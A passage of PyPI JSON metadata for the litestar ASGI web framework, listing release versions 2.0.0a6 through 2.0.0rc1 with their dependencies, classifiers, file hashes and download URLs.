Hirschfeld","maintainer_email":"nhirschfeld@gmail.com","name":"litestar","package_url":"https://pypi.org/project/litestar/","platform":null,"project_url":"https://pypi.org/project/litestar/","project_urls":{"Documentation":"https://docs.litestar.dev/","Homepage":"https://litestar.dev/","Repository":"https://github.com/litestar-org/litestar"},"provides_extra":null,"release_url":"https://pypi.org/project/litestar/2.0.0a6/","requires_dist":["alembic ; extra == \"sqlalchemy\" or extra == \"full\"","anyio (>=3)","attrs ; extra == \"attrs\" or extra == \"full\"","brotli ; extra == \"brotli\" or extra == \"full\"","cattrs ; extra == \"attrs\" or extra == \"full\"","click ; extra == \"cli\" or extra == \"standard\" or extra == \"full\"","cryptography ; extra == \"cryptography\" or extra == \"jwt\" or extra == \"full\"","fast-query-parsers","httpx (>=0.22)","importlib-metadata ; python_version < \"3.10\"","jinja2 (>=3.1.2) ; extra == \"jinja\" or extra == \"standard\" or extra == \"full\"","jsbeautifier ; extra == \"cli\" or extra == \"standard\" or extra == \"full\"","mako (>=1.2.4)","msgspec","multidict (>=6.0.2)","opentelemetry-instrumentation-asgi ; extra == \"opentelemetry\" or extra == \"full\"","picologging ; extra == \"picologging\"","polyfactory (>=2)","pydantic (<2)","python-dateutil ; extra == \"attrs\"","python-jose ; extra == \"jwt\" or extra == \"full\"","pytimeparse ; extra == \"attrs\" or extra == \"full\"","pyyaml","redis[hiredis] (>=4.4.4,!=4.5.0,!=4.5.1,!=4.5.2,!=4.5.3,!=4.5.5) ; extra == \"redis\" or extra == \"full\"","rich (>=13.0.0) ; extra == \"cli\" or extra == \"standard\" or extra == \"full\"","sqlalchemy (>=2.0.12) ; extra == \"sqlalchemy\" or extra == \"full\"","structlog ; extra == \"structlog\" or extra == \"full\"","typing-extensions","uvicorn[standard] (>=0.21.1,<0.22.0) ; extra == \"cli\" or extra == \"standard\" or extra == \"full\"","importlib-resources (>=5.12.0,<6.0.0) ; python_version < \"3.9\""],"requires_python":">=3.8,<4.0","summary":"Performant, light and flexible ASGI API Framework","version":"2.0.0a6","yanked":false,"yanked_reason":null},"last_serial":25130260,"urls":[{"comment_text":"","digests":{"blake2b_256":"1cafc9fea57a43889822afd5f1725e7da5b3366e831b2304cab591ae50cf8dbf","md5":"6e3db93fe2ca3ef547432cb5be5e8fb3","sha256":"e9227a4d44e78d5ff21c4e8db1def0e93eaaf1d8a6bac72c3cce2c0ccecb55c1"},"downloads":-1,"filename":"litestar-2.0.0a6-py3-none-any.whl","has_sig":false,"md5_digest":"6e3db93fe2ca3ef547432cb5be5e8fb3","packagetype":"bdist_wheel","python_version":"py3","requires_python":">=3.8,<4.0","size":446879,"upload_time":"2023-05-09T15:45:40","upload_time_iso_8601":"2023-05-09T15:45:40.211137Z","url":"https://files.pythonhosted.org/packages/1c/af/c9fea57a43889822afd5f1725e7da5b3366e831b2304cab591ae50cf8dbf/litestar-2.0.0a6-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"1ce58de5f627dca207748b6e49826b78c17a83d2022f9b0ea85ffcea81b3c888","md5":"cb838a2de2dd3de3fa11058993db41f1","sha256":"1d0504d40bfa3d813dfbb17b07bfdb7bc5cbf59cd0f85f54b4d22f2929839b50"},"downloads":-1,"filename":"litestar-2.0.0a6.tar.gz","has_sig":false,"md5_digest":"cb838a2de2dd3de3fa11058993db41f1","packagetype":"sdist","python_version":"source","requires_python":">=3.8,<4.0","size":318859,"upload_time":"2023-05-09T15:45:42","upload_time_iso_8601":"2023-05-09T15:45:42.201396Z","url":"https://files.pythonhosted.org/packages/1c/e5/8de5f627dca207748b6e49826b78c17a83d2022f9b0ea85ffcea81b3c888/litestar-2.0.0a6.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"2.0.0a7":{"info":{"author":"Na'aman Hirschfeld","author_email":"nhirschfeld@gmail.com","bugtrack_url":null,"classifiers":["Development Status :: 5 - Production/Stable","Environment :: Web Environment","License :: OSI Approved :: MIT License","Natural Language :: English","Operating System :: OS Independent","Programming Language :: Python","Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9","Topic :: Internet :: WWW/HTTP","Topic :: Software Development","Topic :: Software Development :: Libraries","Typing :: Typed"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"https://litestar.dev/","keywords":"api,rest,http,asgi,pydantic,litestar,starlite,framework,websocket,litestar","license":"MIT","maintainer":"Na'aman Hirschfeld","maintainer_email":"nhirschfeld@gmail.com","name":"litestar","package_url":"https://pypi.org/project/litestar/","platform":null,"project_url":"https://pypi.org/project/litestar/","project_urls":{"Documentation":"https://docs.litestar.dev/","Homepage":"https://litestar.dev/","Repository":"https://github.com/litestar-org/litestar"},"provides_extra":null,"release_url":"https://pypi.org/project/litestar/2.0.0a7/","requires_dist":["alembic ; extra == \"sqlalchemy\" or extra == \"full\"","anyio (>=3)","attrs ; extra == \"attrs\" or extra == \"full\"","brotli ; extra == \"brotli\" or extra == \"full\"","cattrs ; extra == \"attrs\" or extra == \"full\"","click ; extra == \"cli\" or extra == \"standard\" or extra == \"full\"","cryptography ; extra == \"cryptography\" or extra == \"jwt\" or extra == \"full\"","fast-query-parsers","httpx (>=0.22)","importlib-metadata ; python_version < \"3.10\"","jinja2 (>=3.1.2) ; extra == \"jinja\" or extra == \"standard\" or extra == \"full\"","jsbeautifier ; extra == \"cli\" or extra == \"standard\" or extra == \"full\"","mako (>=1.2.4)","msgspec","multidict (>=6.0.2)","opentelemetry-instrumentation-asgi ; extra == \"opentelemetry\" or extra == \"full\"","picologging ; extra == \"picologging\"","polyfactory (>=2)","pydantic (<2)","python-dateutil ; extra == \"attrs\"","python-jose ; extra == \"jwt\" or extra == \"full\"","pytimeparse ; extra == \"attrs\" or extra == \"full\"","pyyaml","redis[hiredis] (>=4.4.4,!=4.5.0,!=4.5.1,!=4.5.2,!=4.5.3,!=4.5.5) ; extra == \"redis\" or extra == \"full\"","rich (>=13.0.0) ; extra == \"cli\" or extra == \"standard\" or extra == \"full\"","sqlalchemy (>=2.0.12) ; extra == \"sqlalchemy\" or extra == \"full\"","structlog ; extra == \"structlog\" or extra == \"full\"","typing-extensions","uvicorn[standard] (>=0.21.1,<0.22.0) ; extra == \"cli\" or extra == \"standard\" or extra == \"full\"","importlib-resources (>=5.12.0,<6.0.0) ; python_version < \"3.9\""],"requires_python":">=3.8,<4.0","summary":"Performant, light and flexible ASGI API Framework","version":"2.0.0a7","yanked":false,"yanked_reason":null},"last_serial":25130260,"urls":[{"comment_text":"","digests":{"blake2b_256":"66596f40e10cdc59740aaf68a5e648076f46c8b54a5d8a19849795e217309d98","md5":"8db6debda8a76a8a2478221114aa6c77","sha256":"92de105e2c5f2d89a4ad4d6c181c765b6a08d5be10337b7c94578490b16a7842"},"downloads":-1,"filename":"litestar-2.0.0a7-py3-none-any.whl","has_sig":false,"md5_digest":"8db6debda8a76a8a2478221114aa6c77","packagetype":"bdist_wheel","python_version":"py3","requires_python":">=3.8,<4.0","size":450866,"upload_time":"2023-05-14T12:47:03","upload_time_iso_8601":"2023-05-14T12:47:03.595303Z","url":"https://files.pythonhosted.org/packages/66/59/6f40e10cdc59740aaf68a5e648076f46c8b54a5d8a19849795e217309d98/litestar-2.0.0a7-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"d7275783dd3f714251c5c87044dcf3406a40c4eea339d24f14c38cba405123f0","md5":"21cd2d990e91863ea3223e200bb0f863","sha256":"da515a979a23f2fd4a80056d54409006e62b6e7f643bf13b1bb4152bd7e184f1"},"downloads":-1,"filename":"litestar-2.0.0a7.tar.gz","has_sig":false,"md5_digest":"21cd2d990e91863ea3223e200bb0f863","packagetype":"sdist","python_version":"source","requires_python":">=3.8,<4.0","size":322064,"upload_time":"2023-05-14T12:47:05","upload_time_iso_8601":"2023-05-14T12:47:05.819649Z","url":"https://files.pythonhosted.org/packages/d7/27/5783dd3f714251c5c87044dcf3406a40c4eea339d24f14c38cba405123f0/litestar-2.0.0a7.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"2.0.0b1":{"info":{"author":"Na'aman Hirschfeld","author_email":"nhirschfeld@gmail.com","bugtrack_url":null,"classifiers":["Development Status :: 5 - Production/Stable","Environment :: Web Environment","License :: OSI Approved :: MIT License","Natural Language :: English","Operating System :: OS Independent","Programming Language :: Python","Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9","Topic :: Internet :: WWW/HTTP","Topic :: Software Development","Topic :: Software Development :: Libraries","Typing :: Typed"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"https://litestar.dev/","keywords":"api,rest,http,asgi,pydantic,litestar,starlite,framework,websocket,litestar","license":"MIT","maintainer":"Na'aman Hirschfeld","maintainer_email":"nhirschfeld@gmail.com","name":"litestar","package_url":"https://pypi.org/project/litestar/","platform":null,"project_url":"https://pypi.org/project/litestar/","project_urls":{"Blog":"https://blog.litestar.dev","Changelog":"https://github.com/litestar-org/litestar/releases/","Discord":"https://discord.gg/MmcwxztmQb","Documentation":"https://docs.litestar.dev/","Homepage":"https://litestar.dev/","Issue Tracker":"https://github.com/litestar-org/litestar/issues?q=is%3Aissue+is%3Aopen+sort%3Aupdated-desc","Reddit":"https://www.reddit.com/r/litestarapi","Repository":"https://github.com/litestar-org/litestar","Twitter":"https://twitter.com/LitestarAPI"},"provides_extra":null,"release_url":"https://pypi.org/project/litestar/2.0.0b1/","requires_dist":["alembic ; extra == \"sqlalchemy\" or extra == \"full\"","anyio (>=3)","attrs ; extra == \"attrs\" or extra == \"full\"","brotli ; extra == \"brotli\" or extra == \"full\"","cattrs ; extra == \"attrs\" or extra == \"full\"","click ; extra == \"cli\" or extra == \"standard\" or extra == \"full\"","cryptography ; extra == \"cryptography\" or extra == \"jwt\" or extra == \"full\"","fast-query-parsers","httpx (>=0.22)","importlib-metadata ; python_version < \"3.10\"","jinja2 (>=3.1.2) ; extra == \"jinja\" or extra == \"standard\" or extra == \"full\"","jsbeautifier ; extra == \"cli\" or extra == \"standard\" or extra == \"full\"","mako (>=1.2.4)","msgspec","multidict (>=6.0.2)","opentelemetry-instrumentation-asgi ; extra == \"opentelemetry\" or extra == \"full\"","picologging ; extra == \"picologging\"","polyfactory (>=2)","pydantic (<2)","python-dateutil ; extra == \"attrs\"","python-jose ; extra == \"jwt\" or extra == \"full\"","pytimeparse ; extra == \"attrs\" or extra == \"full\"","pyyaml","redis[hiredis] (>=4.4.4,!=4.5.0,!=4.5.1,!=4.5.2,!=4.5.3,!=4.5.5) ; extra == \"redis\" or extra == \"full\"","rich (>=13.0.0) ; extra == \"cli\" or extra == \"standard\" or extra == \"full\"","rich-click ; extra == \"cli\" or extra == \"standard\"","sqlalchemy (>=2.0.12) ; extra == \"sqlalchemy\" or extra == \"full\"","structlog ; extra == \"structlog\" or extra == \"full\"","typing-extensions","uvicorn[standard] (>=0.22.0,<0.23.0) ; extra == \"cli\" or extra == \"standard\" or extra == \"full\"","importlib-resources (>=5.12.0,<6.0.0) ; python_version < \"3.9\""],"requires_python":">=3.8,<4.0","summary":"Litestar - A production-ready, highly performant, extensible ASGI API Framework","version":"2.0.0b1","yanked":false,"yanked_reason":null},"last_serial":25130260,"urls":[{"comment_text":"","digests":{"blake2b_256":"3d732d17b9c7ef2fe7ba6d489a6e6fac4ebf07664a091ab1ccd59ee9e8d166ed","md5":"c9b8a02c933138fe8feb386e46c23fd1","sha256":"ed90d1935c20b410bd36350b919d84100755b7edae3aa3981b8288f8a07afe9e"},"downloads":-1,"filename":"litestar-2.0.0b1-py3-none-any.whl","has_sig":false,"md5_digest":"c9b8a02c933138fe8feb386e46c23fd1","packagetype":"bdist_wheel","python_version":"py3","requires_python":">=3.8,<4.0","size":470827,"upload_time":"2023-06-16T11:23:50","upload_time_iso_8601":"2023-06-16T11:23:50.130848Z","url":"https://files.pythonhosted.org/packages/3d/73/2d17b9c7ef2fe7ba6d489a6e6fac4ebf07664a091ab1ccd59ee9e8d166ed/litestar-2.0.0b1-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"900aaab0636a1120e87cc24507e206a5ff4d473e1fef0b790aaff52299dc6835","md5":"57c94f0f8b33a84c10847342beb12cde","sha256":"1dde21589e09fbe2d7520faedf4339ef4f40c02b0189172ab196445045a612c9"},"downloads":-1,"filename":"litestar-2.0.0b1.tar.gz","has_sig":false,"md5_digest":"57c94f0f8b33a84c10847342beb12cde","packagetype":"sdist","python_version":"source","requires_python":">=3.8,<4.0","size":332853,"upload_time":"2023-06-16T11:23:52","upload_time_iso_8601":"2023-06-16T11:23:52.482623Z","url":"https://files.pythonhosted.org/packages/90/0a/aab0636a1120e87cc24507e206a5ff4d473e1fef0b790aaff52299dc6835/litestar-2.0.0b1.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"2.0.0b2":{"info":{"author":"Na'aman Hirschfeld","author_email":"nhirschfeld@gmail.com","bugtrack_url":null,"classifiers":["Development Status :: 5 - Production/Stable","Environment :: Web Environment","License :: OSI Approved :: MIT License","Natural Language :: English","Operating System :: OS Independent","Programming Language :: Python","Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9","Topic :: Internet :: WWW/HTTP","Topic :: Software Development","Topic :: Software Development :: Libraries","Typing :: Typed"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"https://litestar.dev/","keywords":"api,rest,http,asgi,pydantic,litestar,starlite,framework,websocket,litestar","license":"MIT","maintainer":"Na'aman Hirschfeld","maintainer_email":"nhirschfeld@gmail.com","name":"litestar","package_url":"https://pypi.org/project/litestar/","platform":null,"project_url":"https://pypi.org/project/litestar/","project_urls":{"Blog":"https://blog.litestar.dev","Changelog":"https://github.com/litestar-org/litestar/releases/","Discord":"https://discord.gg/MmcwxztmQb","Documentation":"https://docs.litestar.dev/","Homepage":"https://litestar.dev/","Issue Tracker":"https://github.com/litestar-org/litestar/issues?q=is%3Aissue+is%3Aopen+sort%3Aupdated-desc","Reddit":"https://www.reddit.com/r/litestarapi","Repository":"https://github.com/litestar-org/litestar","Twitter":"https://twitter.com/LitestarAPI"},"provides_extra":null,"release_url":"https://pypi.org/project/litestar/2.0.0b2/","requires_dist":["alembic ; extra == \"sqlalchemy\" or extra == \"full\"","annotated-types ; extra == \"annotated-types\"","anyio (>=3)","attrs ; extra == \"attrs\" or extra == \"full\"","brotli ; extra == \"brotli\" or extra == \"full\"","cattrs ; extra == \"attrs\" or extra == \"full\"","click ; extra == \"cli\" or extra == \"standard\" or extra == \"full\"","cryptography ; extra == \"cryptography\" or extra == \"jwt\" or extra == \"full\"","fast-query-parsers","httpx (>=0.22)","importlib-metadata ; python_version < \"3.10\"","importlib-resources (>=5.12.0) ; python_version < \"3.9\"","jinja2 (>=3.1.2) ; extra == \"jinja\" or extra == \"standard\" or extra == \"full\"","jsbeautifier ; extra == \"cli\" or extra == \"standard\" or extra == \"full\"","mako (>=1.2.4)","msgspec (>=0.16.0)","multidict (>=6.0.2)","opentelemetry-instrumentation-asgi ; extra == \"opentelemetry\" or extra == \"full\"","picologging ; extra == \"picologging\"","polyfactory (>=2.3.2)","prometheus-client ; extra == \"prometheus\" or extra == \"full\"","pydantic (<2)","python-dateutil ; extra == \"attrs\" or extra == \"full\"","python-jose ; extra == \"jwt\" or extra == \"full\"","pytimeparse ; extra == \"attrs\" or extra == \"full\"","pyyaml","redis[hiredis] (>=4.4.4,!=4.5.0,!=4.5.1,!=4.5.2,!=4.5.3,!=4.5.5) ; extra == \"redis\" or extra == \"full\"","rich (>=13.0.0) ; extra == \"cli\" or extra == \"standard\" or extra == \"full\"","rich-click ; extra == \"cli\" or extra == \"standard\"","sqlalchemy (>=2.0.12) ; extra == \"sqlalchemy\" or extra == \"full\"","structlog ; extra == \"structlog\" or extra == \"full\"","tortoise-orm (>=0.17.0) ; extra == \"tortoise-orm\"","typing-extensions","uvicorn[standard] (>=0.22.0) ; extra == \"cli\" or extra == \"standard\" or extra == \"full\""],"requires_python":">=3.8,<4.0","summary":"Litestar - A production-ready, highly performant, extensible ASGI API Framework","version":"2.0.0b2","yanked":false,"yanked_reason":null},"last_serial":25130260,"urls":[{"comment_text":"","digests":{"blake2b_256":"8eef948b38d7c83225a1c8058e71a0b9f07653241c3ffc160ce6ee1806688cf5","md5":"8b4862a9844eba55a0a5ba97bcfbe620","sha256":"a041c27a1f8ea2081a67fa94ac88f8e74a0e5a2cd33031c3bc10e88f4f47ef88"},"downloads":-1,"filename":"litestar-2.0.0b2-py3-none-any.whl","has_sig":false,"md5_digest":"8b4862a9844eba55a0a5ba97bcfbe620","packagetype":"bdist_wheel","python_version":"py3","requires_python":">=3.8,<4.0","size":476640,"upload_time":"2023-06-24T19:33:24","upload_time_iso_8601":"2023-06-24T19:33:24.383882Z","url":"https://files.pythonhosted.org/packages/8e/ef/948b38d7c83225a1c8058e71a0b9f07653241c3ffc160ce6ee1806688cf5/litestar-2.0.0b2-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"d0d7f6baf96a62229f7e18b2ecfac937a16fe01a321136ab01c1965b36dc389e","md5":"ab9c3e652102330e6782b6b0fc1318bd","sha256":"874162d8d26963c3a8c4b7405b8facde45c599c472487929bb7e70b96fcec5e0"},"downloads":-1,"filename":"litestar-2.0.0b2.tar.gz","has_sig":false,"md5_digest":"ab9c3e652102330e6782b6b0fc1318bd","packagetype":"sdist","python_version":"source","requires_python":">=3.8,<4.0","size":336970,"upload_time":"2023-06-24T19:33:26","upload_time_iso_8601":"2023-06-24T19:33:26.764057Z","url":"https://files.pythonhosted.org/packages/d0/d7/f6baf96a62229f7e18b2ecfac937a16fe01a321136ab01c1965b36dc389e/litestar-2.0.0b2.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"2.0.0b3":{"info":{"author":"Na'aman Hirschfeld","author_email":"nhirschfeld@gmail.com","bugtrack_url":null,"classifiers":["Development Status :: 5 - Production/Stable","Environment :: Web Environment","Framework :: AsyncIO","Framework :: Pydantic","Framework :: Pydantic :: 1","Intended Audience :: Developers","Intended Audience :: Information Technology","Intended Audience :: System Administrators","License :: OSI Approved :: MIT License","Natural Language :: English","Operating System :: OS Independent","Programming Language :: Python","Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9","Topic :: Internet","Topic :: Internet :: WWW/HTTP","Topic :: Internet :: WWW/HTTP :: HTTP Servers","Topic :: Software Development","Topic :: Software Development :: Libraries","Topic :: Software Development :: Libraries :: Application Frameworks","Topic :: Software Development :: Libraries :: Python Modules","Typing :: Typed"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"https://litestar.dev/","keywords":"api,rest,http,asgi,pydantic,litestar,starlite,framework,websocket,litestar","license":"MIT","maintainer":"Na'aman Hirschfeld","maintainer_email":"nhirschfeld@gmail.com","name":"litestar","package_url":"https://pypi.org/project/litestar/","platform":null,"project_url":"https://pypi.org/project/litestar/","project_urls":{"Blog":"https://blog.litestar.dev","Changelog":"https://github.com/litestar-org/litestar/releases/","Discord":"https://discord.gg/MmcwxztmQb","Documentation":"https://docs.litestar.dev/","Homepage":"https://litestar.dev/","Issue Tracker":"https://github.com/litestar-org/litestar/issues?q=is%3Aissue+is%3Aopen+sort%3Aupdated-desc","Reddit":"https://www.reddit.com/r/litestarapi","Repository":"https://github.com/litestar-org/litestar","Twitter":"https://twitter.com/LitestarAPI"},"provides_extra":null,"release_url":"https://pypi.org/project/litestar/2.0.0b3/","requires_dist":["alembic ; extra == \"sqlalchemy\" or extra == \"full\"","annotated-types ; extra == \"annotated-types\"","anyio (>=3)","attrs ; extra == \"attrs\" or extra == \"full\"","brotli ; extra == \"brotli\" or extra == \"full\"","click ; extra == \"cli\" or extra == \"standard\" or extra == \"full\"","cryptography ; extra == \"cryptography\" or extra == \"jwt\" or extra == \"full\"","fast-query-parsers (>=1.0.2)","httpx (>=0.22)","importlib-metadata ; python_version < \"3.10\"","importlib-resources (>=5.12.0) ; python_version < \"3.9\"","jinja2 (>=3.1.2) ; extra == \"jinja\" or extra == \"standard\" or extra == \"full\"","jsbeautifier ; extra == \"cli\" or extra == \"standard\" or extra == \"full\"","mako (>=1.2.4)","msgspec (>=0.17.0)","multidict (>=6.0.2)","opentelemetry-instrumentation-asgi ; extra == \"opentelemetry\" or extra == \"full\"","piccolo","picologging ; extra == \"picologging\"","polyfactory (>=2.3.2)","prometheus-client ; extra == \"prometheus\" or extra == \"full\"","pydantic[email] ; extra == \"pydantic\"","python-jose ; extra == \"jwt\" or extra == \"full\"","pyyaml","redis[hiredis] (>=4.4.4,<4.5.0) ; extra == \"redis\" or extra == \"full\"","rich (>=13.0.0) ; extra == \"cli\" or extra == \"standard\" or extra == \"full\"","rich-click ; extra == \"cli\" or extra == \"standard\"","sqlalchemy (>=2.0.12) ; extra == \"sqlalchemy\" or extra == \"full\"","structlog ; extra == \"structlog\" or extra == \"full\"","tortoise-orm (>=0.17.0) ; extra == \"tortoise-orm\"","typing-extensions","uvicorn[standard] (>=0.22.0) ; extra == \"cli\" or extra == \"standard\" or extra == \"full\""],"requires_python":">=3.8,<4.0","summary":"Litestar - A production-ready, highly performant, extensible ASGI API Framework","version":"2.0.0b3","yanked":false,"yanked_reason":null},"last_serial":25130260,"urls":[{"comment_text":"","digests":{"blake2b_256":"bf0422a39f419046158a22ec7e66765b8cf2d23896d62c9dbea77d2a7c36d0c5","md5":"fe9f57d04a80fb32fb78d34dcffa4ea9","sha256":"516ab1622e1b80edcfff62470c6b1b44ecd0d9673baf9c9cb0ae7d55464214e4"},"downloads":-1,"filename":"litestar-2.0.0b3-py3-none-any.whl","has_sig":false,"md5_digest":"fe9f57d04a80fb32fb78d34dcffa4ea9","packagetype":"bdist_wheel","python_version":"py3","requires_python":">=3.8,<4.0","size":472751,"upload_time":"2023-07-20T13:51:56","upload_time_iso_8601":"2023-07-20T13:51:56.396039Z","url":"https://files.pythonhosted.org/packages/bf/04/22a39f419046158a22ec7e66765b8cf2d23896d62c9dbea77d2a7c36d0c5/litestar-2.0.0b3-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"a23dd0c25f668908e27a59ddc96f8140c1fada7cd15d6a49f249ab405e8eca10","md5":"fc0e9a41f9ee1e1762719d9c14d4749d","sha256":"df19e1ccf0f96b17f1cc0b305e034ef71e8d4f42e3ab921cc951d4348d55416a"},"downloads":-1,"filename":"litestar-2.0.0b3.tar.gz","has_sig":false,"md5_digest":"fc0e9a41f9ee1e1762719d9c14d4749d","packagetype":"sdist","python_version":"source","requires_python":">=3.8,<4.0","size":330269,"upload_time":"2023-07-20T13:51:58","upload_time_iso_8601":"2023-07-20T13:51:58.347098Z","url":"https://files.pythonhosted.org/packages/a2/3d/d0c25f668908e27a59ddc96f8140c1fada7cd15d6a49f249ab405e8eca10/litestar-2.0.0b3.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"2.0.0b4":{"info":{"author":"Na'aman Hirschfeld","author_email":"nhirschfeld@gmail.com","bugtrack_url":null,"classifiers":["Development Status :: 5 - Production/Stable","Environment :: Web Environment","Framework :: AsyncIO","Framework :: Pydantic","Framework :: Pydantic :: 1","Intended Audience :: Developers","Intended Audience :: Information Technology","Intended Audience :: System Administrators","License :: OSI Approved :: MIT License","Natural Language :: English","Operating System :: OS Independent","Programming Language :: Python","Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9","Topic :: Internet","Topic :: Internet :: WWW/HTTP","Topic :: Internet :: WWW/HTTP :: HTTP Servers","Topic :: Software Development","Topic :: Software Development :: Libraries","Topic :: Software Development :: Libraries :: Application Frameworks","Topic :: Software Development :: Libraries :: Python Modules","Typing :: Typed"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"https://litestar.dev/","keywords":"api,rest,http,asgi,pydantic,litestar,starlite,framework,websocket,litestar","license":"MIT","maintainer":"Na'aman Hirschfeld","maintainer_email":"nhirschfeld@gmail.com","name":"litestar","package_url":"https://pypi.org/project/litestar/","platform":null,"project_url":"https://pypi.org/project/litestar/","project_urls":{"Blog":"https://blog.litestar.dev","Changelog":"https://github.com/litestar-org/litestar/releases/","Discord":"https://discord.gg/MmcwxztmQb","Documentation":"https://docs.litestar.dev/","Homepage":"https://litestar.dev/","Issue Tracker":"https://github.com/litestar-org/litestar/issues?q=is%3Aissue+is%3Aopen+sort%3Aupdated-desc","Reddit":"https://www.reddit.com/r/litestarapi","Repository":"https://github.com/litestar-org/litestar","Twitter":"https://twitter.com/LitestarAPI"},"provides_extra":null,"release_url":"https://pypi.org/project/litestar/2.0.0b4/","requires_dist":["alembic ; extra == \"sqlalchemy\" or extra == \"full\"","annotated-types ; extra == \"annotated-types\" or extra == \"full\"","anyio (>=3)","attrs ; extra == \"attrs\" or extra == \"full\"","brotli ; extra == \"brotli\" or extra == \"full\"","click ; extra == \"cli\" or extra == \"standard\" or extra == \"full\"","cryptography ; extra == \"cryptography\" or extra == \"jwt\" or extra == \"full\"","fast-query-parsers (>=1.0.2)","httpx (>=0.22)","importlib-metadata ; python_version < \"3.10\"","importlib-resources (>=5.12.0) ; python_version < \"3.9\"","jinja2 (>=3.1.2) ; extra == \"jinja\" or extra == \"standard\" or extra == \"full\"","jsbeautifier ; extra == \"cli\" or extra == \"standard\" or extra == \"full\"","mako (>=1.2.4) ; extra == \"mako\" or extra == \"full\"","msgspec (>=0.17.0)","multidict (>=6.0.2)","opentelemetry-instrumentation-asgi ; extra == \"opentelemetry\" or extra == \"full\"","piccolo ; extra == \"piccolo\" or extra == \"full\"","picologging ; extra == \"picologging\" or extra == \"full\"","polyfactory (>=2.6.3)","prometheus-client ; extra == \"prometheus\" or extra == \"full\"","pydantic[email] ; extra == \"pydantic\" or extra == \"full\"","pydantic-extra-types ; extra == \"pydantic\" or extra == \"full\"","python-jose ; extra == \"jwt\" or extra == \"full\"","pyyaml","redis[hiredis] (>=4.4.4,<4.5.0) ; extra == \"redis\" or extra == \"full\"","rich (>=13.0.0) ; extra == \"cli\" or extra == \"standard\" or extra == \"full\"","rich-click ; extra == \"cli\" or extra == \"standard\" or extra == \"full\"","sqlalchemy (>=2.0.12) ; extra == \"sqlalchemy\" or extra == \"full\"","structlog ; extra == \"structlog\" or extra == \"full\"","typing-extensions","uvicorn[standard] (>=0.22.0) ; extra == \"cli\" or extra == \"standard\" or extra == \"full\""],"requires_python":">=3.8,<4.0","summary":"Litestar - A production-ready, highly performant, extensible ASGI API Framework","version":"2.0.0b4","yanked":false,"yanked_reason":null},"last_serial":25130260,"urls":[{"comment_text":"","digests":{"blake2b_256":"149428ad1e6fe0055928d4d8c022920ec302a46d317cb622093ad108498a6fd6","md5":"38c3ca221d36f5dec0eace7bf1ec1ef1","sha256":"47cdcd598247c56e3a928338da5f0b57c0a876e512f5d7ae62e109d034f69c7c"},"downloads":-1,"filename":"litestar-2.0.0b4-py3-none-any.whl","has_sig":false,"md5_digest":"38c3ca221d36f5dec0eace7bf1ec1ef1","packagetype":"bdist_wheel","python_version":"py3","requires_python":">=3.8,<4.0","size":472753,"upload_time":"2023-07-21T15:49:46","upload_time_iso_8601":"2023-07-21T15:49:46.957818Z","url":"https://files.pythonhosted.org/packages/14/94/28ad1e6fe0055928d4d8c022920ec302a46d317cb622093ad108498a6fd6/litestar-2.0.0b4-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"95560c1725426cbee733cb681ee2c5f5f77ceb0522961002a8f6dc6230ee2b00","md5":"bd26fec4f46363bf8f064817545f5c57","sha256":"87e7bdad774a71c9a745194432dd025aaa605d32104f21fac0e9f1a73ec72ae9"},"downloads":-1,"filename":"litestar-2.0.0b4.tar.gz","has_sig":false,"md5_digest":"bd26fec4f46363bf8f064817545f5c57","packagetype":"sdist","python_version":"source","requires_python":">=3.8,<4.0","size":330166,"upload_time":"2023-07-21T15:49:50","upload_time_iso_8601":"2023-07-21T15:49:50.540203Z","url":"https://files.pythonhosted.org/packages/95/56/0c1725426cbee733cb681ee2c5f5f77ceb0522961002a8f6dc6230ee2b00/litestar-2.0.0b4.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"2.0.0rc1":{"info":{"author":"Na'aman Hirschfeld","author_email":"nhirschfeld@gmail.com","bugtrack_url":null,"classifiers":["Development Status :: 5 - Production/Stable","Environment :: Web Environment","Framework :: AsyncIO","Framework :: Pydantic","Framework :: Pydantic :: 1","Intended Audience :: Developers","Intended Audience :: Information Technology","Intended Audience :: System Administrators","License :: OSI Approved :: MIT License","Natural Language :: English","Operating System :: OS Independent","Programming Language :: Python","Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9","Topic :: Internet","Topic :: Internet :: WWW/HTTP","Topic :: Internet 